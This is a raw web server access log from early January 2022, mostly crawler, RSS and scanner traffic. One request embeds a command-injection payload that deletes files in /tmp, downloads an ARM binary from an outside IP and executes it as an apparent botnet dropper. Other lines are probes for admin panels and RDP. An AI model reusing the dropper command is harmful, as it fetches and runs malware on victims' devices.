5.173.42.32 - - [02/Jan/2022:15:17:35 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
5.173.42.32 - - [02/Jan/2022:15:32:35 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
221.158.166.50 - - [02/Jan/2022:15:37:52 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 212.192.216.46/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws HTTP/1.1" 301 162 "-" "Hello, world"
89.248.172.16 - - [02/Jan/2022:15:38:44 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
89.248.172.16 - - [02/Jan/2022:15:38:45 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "-"
89.248.172.16 - - [02/Jan/2022:15:38:45 +0100] "GET /sitemap.xml HTTP/1.1" 301 162 "-" "-"
89.248.172.16 - - [02/Jan/2022:15:38:46 +0100] "GET /.well-known/security.txt HTTP/1.1" 301 162 "-" "-"
89.248.172.16 - - [02/Jan/2022:15:38:54 +0100] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
89.248.172.16 - - [02/Jan/2022:15:38:55 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
89.248.172.16 - - [02/Jan/2022:15:38:56 +0100] "\x03\xFF\xB8\xD1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 150 "-" "-"
35.233.62.116 - - [02/Jan/2022:15:38:59 +0100] "GET / HTTP/1.1" 301 162 "-" "python-requests/2.26.0"
5.173.42.32 - - [02/Jan/2022:15:47:35 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
89.248.172.16 - - [02/Jan/2022:16:04:36 +0100] "GET / HTTP/1.1" 200 1345 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
89.248.172.16 - - [02/Jan/2022:16:04:51 +0100] "" 400 0 "-" "-"
89.248.172.16 - - [02/Jan/2022:16:04:52 +0100] "" 400 0 "-" "-"
89.248.172.16 - - [02/Jan/2022:16:04:52 +0100] "" 400 0 "-" "-"
89.248.172.16 - - [02/Jan/2022:16:05:01 +0100] "GET /robots.txt HTTP/1.1" 200 1345 "-" "-"
89.248.172.16 - - [02/Jan/2022:16:05:01 +0100] "GET /sitemap.xml HTTP/1.1" 200 1345 "-" "-"
89.248.172.16 - - [02/Jan/2022:16:05:02 +0100] "GET /.well-known/security.txt HTTP/1.1" 200 1345 "-" "-"
89.248.172.16 - - [02/Jan/2022:16:05:06 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
89.248.172.16 - - [02/Jan/2022:16:05:09 +0100] "" 400 0 "-" "-"
89.248.172.16 - - [02/Jan/2022:16:05:10 +0100] "\x03\x22\xBF\xD1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 150 "-" "-"
34.140.248.32 - - [02/Jan/2022:16:05:15 +0100] "GET / HTTP/1.1" 400 248 "-" "python-requests/2.26.0"
5.173.88.111 - - [02/Jan/2022:16:17:35 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
40.77.167.19 - - [02/Jan/2022:16:29:03 +0100] "GET /sitemap.xml HTTP/2.0" 200 642 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
27.124.5.34 - - [02/Jan/2022:16:35:46 +0100] "GET / HTTP/1.1" 400 248 "-" "-"
27.124.5.34 - - [02/Jan/2022:16:36:10 +0100] "GET /favicon.ico HTTP/1.1" 400 248 "-" "Go-http-client/1.1"
27.124.5.34 - - [02/Jan/2022:16:36:18 +0100] "GET /robots.txt HTTP/1.1" 400 248 "-" "Go-http-client/1.1"
27.124.5.34 - - [02/Jan/2022:16:36:28 +0100] "GET /sitemap.xml HTTP/1.1" 400 248 "-" "Go-http-client/1.1"
207.46.13.229 - - [02/Jan/2022:16:39:01 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.19 - - [02/Jan/2022:16:39:04 +0100] "GET /sitemap.xml HTTP/2.0" 200 642 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
209.141.53.74 - - [02/Jan/2022:16:58:19 +0100] "GET /config/getuser?index=0 HTTP/1.1" 400 248 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
207.46.13.217 - - [02/Jan/2022:17:43:59 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
52.91.12.216 - - [02/Jan/2022:17:46:04 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Ruby"
52.91.12.216 - - [02/Jan/2022:17:46:04 +0100] "GET /rss/ HTTP/1.1" 200 3444 "-" "Ruby"
35.195.93.98 - - [02/Jan/2022:17:48:05 +0100] "GET / HTTP/1.1" 301 162 "-" "python-requests/2.26.0"
45.137.23.232 - - [02/Jan/2022:18:15:26 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 zgrab/0.x"
192.241.212.117 - - [02/Jan/2022:18:17:14 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 zgrab/0.x"
192.241.195.46 - - [02/Jan/2022:18:35:03 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
45.146.166.188 - - [02/Jan/2022:18:41:37 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
125.64.94.140 - - [02/Jan/2022:18:52:13 +0100] "GET / HTTP/1.0" 200 1345 "-" "-"
125.64.94.140 - - [02/Jan/2022:18:52:17 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [02/Jan/2022:18:52:19 +0100] "GET /robots.txt HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [02/Jan/2022:18:52:23 +0100] "GET /.well-known/security.txt HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
45.146.166.188 - - [02/Jan/2022:19:44:39 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
136.144.41.117 - - [02/Jan/2022:20:00:04 +0100] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
34.240.193.51 - - [02/Jan/2022:20:51:58 +0100] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03_\xC2z\x83\x09E\xCC\xC7\xAA\xBC\xF5B\x88\xBC\x9B\x1C\xCFI\xF8\xF7%\x9A\xA4ds\x06\x1FNcP\xDB\xC3 \xED\x12P\xB9\xD85\xAD\xCE\x8F\x00\xB2\xFC^\xBD\xE5\xAA\xFD\xEC:\x01MM\xA0-X\xE2\xF6L\x7Fi\x175\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 150 "-" "-"
34.240.193.51 - - [02/Jan/2022:20:52:17 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36"
137.184.143.150 - - [02/Jan/2022:21:03:44 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
66.249.70.97 - - [02/Jan/2022:21:16:17 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.100 - - [02/Jan/2022:21:16:18 +0100] "GET /weekly-stories/ HTTP/1.1" 200 15375 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.19 - - [02/Jan/2022:21:26:21 +0100] "GET /tag/weekly-stories/ HTTP/2.0" 200 13276 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
205.185.114.93 - - [02/Jan/2022:21:52:54 +0100] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 400 150 "-" "-"
47.243.138.100 - - [02/Jan/2022:22:08:19 +0100] "GET / HTTP/1.1" 400 150 "-" "-"
34.140.248.32 - - [02/Jan/2022:22:08:33 +0100] "GET / HTTP/1.1" 200 595 "-" "python-requests/2.26.0"
192.241.204.61 - - [02/Jan/2022:22:33:52 +0100] "GET /manager/text/list HTTP/1.1" 400 248 "-" "Mozilla/5.0 zgrab/0.x"
167.94.138.59 - - [02/Jan/2022:22:36:53 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
167.94.138.59 - - [02/Jan/2022:22:36:53 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.59 - - [02/Jan/2022:22:36:53 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
44.200.187.13 - - [02/Jan/2022:22:45:36 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Ruby"
44.200.187.13 - - [02/Jan/2022:22:45:36 +0100] "GET /rss/ HTTP/1.1" 200 3449 "-" "Ruby"
209.141.53.74 - - [02/Jan/2022:23:00:56 +0100] "GET /config/getuser?index=0 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
66.249.70.27 - - [02/Jan/2022:23:31:17 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.27 - - [02/Jan/2022:23:31:18 +0100] "GET /weekly-stories/amp/ HTTP/1.1" 200 5973 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.7 - - [02/Jan/2022:23:31:18 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.9 - - [02/Jan/2022:23:31:19 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.27 - - [02/Jan/2022:23:31:19 +0100] "GET / HTTP/1.1" 200 13146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.229 - - [02/Jan/2022:23:45:07 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.150 - - [02/Jan/2022:23:45:15 +0100] "GET /sitemap-authors.xml HTTP/2.0" 200 344 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
118.123.105.67 - - [03/Jan/2022:00:01:46 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
118.123.105.67 - - [03/Jan/2022:00:01:47 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [03/Jan/2022:00:01:48 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [03/Jan/2022:00:01:49 +0100] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [03/Jan/2022:00:01:50 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "http://85.255.1.106/favicon.ico" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [03/Jan/2022:00:01:51 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [03/Jan/2022:00:01:52 +0100] "GET /robots.txt HTTP/1.1" 200 595 "http://85.255.1.106/robots.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [03/Jan/2022:00:01:53 +0100] "GET /.well-known/security.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [03/Jan/2022:00:02:17 +0100] "GET /.well-known/security.txt/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
66.249.70.25 - - [03/Jan/2022:00:16:17 +0100] "GET /weekly-stories/amp/ HTTP/1.1" 200 5973 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
193.178.169.209 - - [03/Jan/2022:00:49:41 +0100] "HEAD /?xHAPPY-NEW-YEAR-FROM-DC8044.COM HTTP/1.1" 301 0 "-" "-"
193.178.169.209 - - [03/Jan/2022:00:49:41 +0100] "HEAD /?x.............................. HTTP/1.1" 301 0 "-" "-"
193.178.169.209 - - [03/Jan/2022:00:49:41 +0100] "HEAD /?x..............A............... HTTP/1.1" 301 0 "-" "-"
193.178.169.209 - - [03/Jan/2022:00:49:41 +0100] "HEAD /?x.............dXb.............. HTTP/1.1" 301 0 "-" "-"
193.178.169.209 - - [03/Jan/2022:00:49:41 +0100] "HEAD /?x..........dXiXXdXXb........... HTTP/1.1" 301 0 "-" "-"
193.178.169.209 - - [03/Jan/2022:00:49:41 +0100] "HEAD /?x........dXXOXXXXdXXib......... HTTP/1.1" 301 0 "-" "-"
193.178.169.209 - - [03/Jan/2022:00:49:41 +0100] "HEAD /?x.............dXb.............. HTTP/1.1" 301 0 "-" "-"
193.178.169.209 - - [03/Jan/2022:00:49:41 +0100] "HEAD /?x..........dXOXXXXXOb.......... HTTP/1.1" 301 0 "-" "-"
193.178.169.209 - - [03/Jan/2022:00:49:41 +0100] "HEAD /?x......dXXXXiXXXdXXXXXXb....... HTTP/1.1" 301 0 "-" "-"
193.178.169.209 - - [03/Jan/2022:00:49:41 +0100] "HEAD /?x.............III.............. HTTP/1.1" 301 0 "-" "-"
193.178.169.209 - - [03/Jan/2022:00:49:41 +0100] "HEAD /?x.............III.............. HTTP/1.1" 301 0 "-" "-"
193.178.169.209 - - [03/Jan/2022:00:49:41 +0100] "HEAD /?x.............................. HTTP/1.1" 301 0 "-" "-"
193.178.169.209 - - [03/Jan/2022:00:49:41 +0100] "HEAD /?x...Follow.us....t.me/DC8044... HTTP/1.1" 301 0 "-" "-"
193.178.169.209 - - [03/Jan/2022:00:49:41 +0100] "HEAD /?x...WEB...........dc8044.com... HTTP/1.1" 301 0 "-" "-"
193.178.169.209 - - [03/Jan/2022:00:49:41 +0100] "HEAD /?x.............................. HTTP/1.1" 301 0 "-" "-"
193.178.169.209 - - [03/Jan/2022:00:49:41 +0100] "HEAD /?x HTTP/1.1" 301 0 "-" "-"
66.249.70.85 - - [03/Jan/2022:01:01:17 +0100] "GET /robots.txt HTTP/1.1" 200 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
